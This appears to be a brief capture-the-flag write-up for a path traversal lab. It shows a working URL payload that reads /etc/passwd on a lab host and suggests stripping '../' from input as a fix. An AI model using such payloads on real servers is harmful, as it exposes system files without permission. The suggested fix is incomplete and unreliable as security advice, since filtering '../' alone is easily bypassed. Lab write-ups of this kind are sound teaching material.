# How to get the flag

More info in : https://owasp.org/www-community/attacks/Path_Traversal

You can access files stored outside of the web root folder:
http://192.168.0.10:8080/index.php?page=../../../../../../../etc/passwd

# How to prevent
Sanitize input when searching for a particular folder (remove any "../" from input)
